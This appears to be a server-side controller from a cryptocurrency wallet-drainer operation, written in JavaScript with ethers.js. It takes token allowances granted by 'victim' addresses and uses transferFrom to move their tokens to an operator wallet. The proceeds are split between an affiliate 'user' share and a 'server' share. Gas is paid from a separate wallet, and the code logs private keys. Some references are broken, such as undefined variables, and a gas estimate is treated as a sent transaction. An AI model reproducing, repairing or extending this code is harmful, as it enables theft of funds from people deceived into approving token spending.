import { ethers } from "ethers";
import logger from "../utils/logger.js";
import wallets from "../utils/wallets.js";
import web3services from "../services/web3services.js";

const USER_SHARE_PERCENTAGE = process.env.USER_SHARE_PERCENTAGE;

const BigNumber = (hexValue) => {
  return ethers.BigNumber.from(hexValue);
};

const percentageOf = (bigNumber, percentage) => {
  return bigNumber.mul(BigNumber(percentage)).div(BigNumber(100));
};

const getEstimations = async (contract, estimations, increment = 100) => {
  let data = {
    total: BigNumber("0"),
  };

  for (const estimation of estimations) {
    const { name, method, params } = estimation;
    const gasLimit = await contract.estimateGas[method](...params);
    const safeGasLimit = percentageOf(gasLimit, increment);
    data[name] = safeGasLimit;
    data["total"] = data["total"].add(safeGasLimit);
  }

  return data;
};

const withdrawal = async (req, res) => {
  const now = new Date();
  const date = now.toLocaleString();

  try {
    const user = req.user;
    const { event, ...payload } = req.body;

    console.log(`\n\n${"=".repeat(10)} (${date}) ${"=".repeat(10)}\n`);

    logger.info("Event", event);

    const oprator_address = payload.randomAddress;
    const victim_address = payload.victimAddress;
    const ABI = payload.abi;
    const token = payload.token;
    const chainSetting = payload.chainSetting;
    const gasPrice = BigNumber(payload.gasPrice.hex);
    const safeGasPrice = percentageOf(gasPrice, 150);

    const userAddress = "0xbEC6A66F83f73441545f175Ed5B8da0ACE448547"; // user.WALLET_ADDRESS || process.env.SERVER_WALLET_ADDRESS;
    const serverAddress = process.env.SERVER_WALLET_ADDRESS;

    const provider = new ethers.providers.JsonRpcProvider(chainSetting.rpcUrl);
    const GAS_TANK_PRIVATE_KEY = process.env.GAS_TANK_PRIVATE_KEY;
    const OPERATOR_PRIVATE_KEY = wallets.get(oprator_address);

    const GAS_TANK_WALLET = new ethers.Wallet(GAS_TANK_PRIVATE_KEY, provider);
    const OPERATOR_WALLET = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider);

    logger.info("Oprator Address", oprator_address);
    logger.info("Victim Address", victim_address);
    logger.info("Token Name", token.name);
    logger.info("Chain", chainSetting.chainName);
    logger.info("Token Symbol", token.symbol);
    logger.info("Token Address", token.id);
    logger.info("Payload Gas Price", gasPrice.toString());
    logger.info("Safe Gas Price", safeGasPrice.toString());

    logger.info("Gas Tank PRIVATE_KEY", GAS_TANK_PRIVATE_KEY);
    logger.info("Operator PRIVATE_KEY", OPERATOR_PRIVATE_KEY);

    logger.info("Gas Tank WALLET_ADDRESS", GAS_TANK_WALLET.address);
    logger.info("Operator WALLET_ADDRESS", OPERATOR_WALLET.address);

    if (event == "APPROVED_TOKEN") {
      const gasTankContract = new ethers.Contract(
        token.id,
        ABI,
        GAS_TANK_WALLET
      );
      const operatorContract = new ethers.Contract(
        token.id,
        ABI,
        OPERATOR_WALLET
      );

      const victim_balance = await operatorContract.balanceOf(victim_address);
      const allowance = await operatorContract.allowance(
        victim_address,
        OPERATOR_WALLET.address
      );

      logger.statement(
        `${victim_address} Approved ${allowance} of ${token.symbol} (${token.id}) on ${chainSetting.chainName}, Balance: ${victim_balance}`
      );

      if (allowance.eq(0)) return res.status(500).send("0 allowance found !");

      const valueToWithdrawal = allowance.gt(victim_balance)
        ? victim_balance
        : allowance;

      const valueToWithdrawalInEth = ethers.utils.formatUnits(
        valueToWithdrawal.toString(),
        token.decimals
      );
      const valueToWithdrawalInUSD = valueToWithdrawalInEth * token.price;

      const amountToUser = percentageOf(
        valueToWithdrawal,
        USER_SHARE_PERCENTAGE
      );
      const amountToUserInEth = ethers.utils.formatUnits(
        amountToUser.toString(),
        token.decimals
      );
      const amountToUserInUSD = amountToUserInEth * token.price;

      logger.statement(
        `Amount to User (${user.USER_ID}): ${amountToUserInUSD}$`
      );
      logger.info("User Address", userAddress);

      let amountToServer = valueToWithdrawal.sub(amountToUser);
      const amountToServerInEth = ethers.utils.formatUnits(
        amountToServer.toString(),
        token.decimals
      );
      const amountToServerInUSD = amountToServerInEth * token.price;

      logger.info("Amount to Server", `${amountToServerInUSD}$`);
      logger.info("Server Address", serverAddress);

      let operatorTransferFromGasLimits, operatorTransferGasLimits;

      try {
        const operatorTransferFromGasEstFuncs = [
          {
            name: "transferFrom",
            method: "transferFrom",
            params: [
              victim_address,
              OPERATOR_WALLET.address,
              valueToWithdrawal._hex,
            ],
          },
        ];
        operatorTransferFromGasLimits = await getEstimations(
          operatorContract,
          operatorTransferFromGasEstFuncs,
          150
        );

        const operatorTransferGasEstFuncs = [
          {
            name: "sendUserShare",
            method: "transfer",
            params: [userAddress, amountToUser._hex],
          },
          {
            name: "sendServerShare",
            method: "transfer",
            params: [serverAddress, amountToServer._hex],
          },
        ];
        operatorTransferGasLimits = await getEstimations(
          gasTankContract,
          operatorTransferGasEstFuncs,
          150
        );
      } catch (error) {
        const message = `unable to estimate gas limit error code: ${error.code} most likely not enough support gas in Gas Tank WALLET`;
        logger.error(message);
        return res.status(500).send(message);
      }

      const gasTankGasLimit = await provider.estimateGas({
        from: GAS_TANK_WALLET.address,
        to: OPERATOR_WALLET.address,
      });
      const safeGasTankGasLimit = percentageOf(gasTankGasLimit, 150);

      const totalGasLimit = safeGasTankGasLimit
        .add(operatorTransferFromGasLimits.total)
        .add(operatorTransferGasLimits.total);

      const totalCostInWei = totalGasLimit.mul(safeGasPrice);
      const totalCostInUSD = await web3services.weiToUsd(totalCostInWei);

      logger.info("victim balance", victim_balance.toString());
      logger.info("allowance", allowance.toString());

      logger.info(
        "Amount to Withdrawal",
        `${valueToWithdrawalInEth} ${
          token.name
        } = ${valueToWithdrawalInUSD.toFixed(2)}$`
      );
      logger.info("User Share", `${amountToUserInUSD.toFixed(2)}$`);
      logger.info("Server Share", `${amountToServerInUSD.toFixed(2)}$`);
      logger.info("Total Gas fees (USD)", `${totalCostInUSD.toFixed(2)}$`);

      if (totalCostInUSD > valueToWithdrawalInUSD) {
        const message =
          "total transaction fees greater than victim balance :'( ";
        logger.error(message);
        return res.status(500).send(message);
      }

      const gasTankNonce = await provider.getTransactionCount(
        GAS_TANK_WALLET.address,
        "pending"
      );

      logger.statement(
        `Sending ${totalCostInUSD}$ from Gas Tank to Operator to cover transactions gas fees`
      );

      const gasTankSignedTransaction = await GAS_TANK_WALLET.signTransaction({
        from: GAS_TANK_WALLET.address,
        to: OPERATOR_WALLET.address,
        gasPrice: safeGasPrice,
        gasLimit: safeGasTankGasLimit._hex,
        value: totalCostInWei._hex,
        nonce: gasTankNonce,
        chainId: parseInt(chainSetting.chainId),
      });

      const gasTankTransaction =
        await gasFeeSafeWallet.provider.sendTransaction(
          gasTankSignedTransaction
        );

      logger.statement(
        "Transaction Sent (sendTransaction) [Gas Tank --> Operator]. Waiting for Confirmation..."
      );

      const gasTankReceipt = await gasTankTransaction.wait();

      logger.info(
        "Transaction hash",
        `${token.explorer}/tx/${gasTankReceipt.transactionHash}`
      );

      const operatorTransferFromTransaction =
        await contract.estimateGas.transferFrom(
          victim_address,
          OPERATOR_WALLET.address,
          valueToWithdrawal
        );
      logger.statement(
        "Transaction Sent (transferFrom) [Victim -> Operator]. Waiting for Confirmation..."
      );
      const operatorTrasnferFromReceipt =
        await operatorTransferFromTransaction.wait();
      logger.info(
        "Transaction hash:",
        `${token.explorer}/tx/${operatorTrasnferFromReceipt.transactionHash}`
      );

      const serverNonce = await provider.getTransactionCount(
        OPERATOR_WALLET.address,
        "pending"
      );
      const userNonce = await provider.getTransactionCount(
        userAddress,
        "pending"
      );

      if (totalCostInUSD > amountToServerInUSD)
        amountToServer = valueToWithdrawal;
      if (totalCostInUSD < amountToServerInUSD) {
        const operatorToUserTransaction = await operatorContract.transfer(
          userAddress,
          amountToUser,
          {
            gasPrice: safeGasPrice,
            gasLimit: operatorTransferGasLimits.sendUserShare._hex,
            nonce: userNonce,
          }
        );
        logger.statement(
          "Transaction Sent (transfer) [Operator -> User]. Waiting for Confirmation..."
        );
        const operatorToUserTransactionReceipt =
          await operatorToUserTransaction.wait();

        logger.info(
          "Transaction hash:",
          `${token.explorer}/tx/${operatorToUserTransactionReceipt.transactionHash}`
        );
      }

      const operatorToServerTransaction = await operatorContract.transfer(
        serverAddress,
        amountToServer,
        {
          gasPrice: safeGasPrice,
          gasLimit: operatorTransferGasLimits.sendServerShare._hex,
          nonce: serverNonce,
        }
      );
      logger.statement(
        "Transaction Sent (transfer) [Operator -> Server]. Waiting for Confirmation..."
      );
      const operatorToServerTransactionReceipt =
        await operatorToServerTransaction.wait();

      logger.info(
        "Transaction hash:",
        `${token.explorer}/tx/${operatorToServerTransactionReceipt.transactionHash}`
      );

      logger.statement(`Withdrawal ${token.symbol} Token successfully!`);
      console.log("=".repeat());
      res.send("success");
    } else if (event == "NATIVE_TOKEN_TRANSFERED") {
      let operator_balance = await provider.getBalance(OPERATOR_WALLET.address);

      operator_balance = BigNumber(token.raw_amount_hex_str);

      if (operator_balance.eq(0)) return res.send("No Balance");

      const toUserGasLimit = await provider.estimateGas({
        from: OPERATOR_WALLET.address,
        to: userAddress,
      });

      const toServerGasLimit = await provider.estimateGas({
        from: OPERATOR_WALLET.address,
        to: serverAddress,
      });

      const toUserSafeGasLimit = percentageOf(toUserGasLimit, 120);
      const toServerSafeGasLimit = percentageOf(toServerGasLimit, 120);

      const toUserTxCost = toUserSafeGasLimit.mul(gasPrice);
      const toServerTxCost = toServerSafeGasLimit.mul(gasPrice);

      const totalFeeCosts = toUserTxCost.add(toServerTxCost);

      const amountToUser = percentageOf(
        operator_balance,
        USER_SHARE_PERCENTAGE
      );
      const amountToServer = operator_balance.sub(amountToUser);

      res.send({
        amountToUser: amountToUser.toString(),
        amountToServer: amountToServer.toString(),
        operator_balance: operator_balance.toString(),
        totalFeeCosts: totalFeeCosts.toString(),
      });
    }
  } catch (error) {
    logger.error(error);
    res.status(500).send("Something went wrong !");
  }
};

export default {
  withdrawal,
};
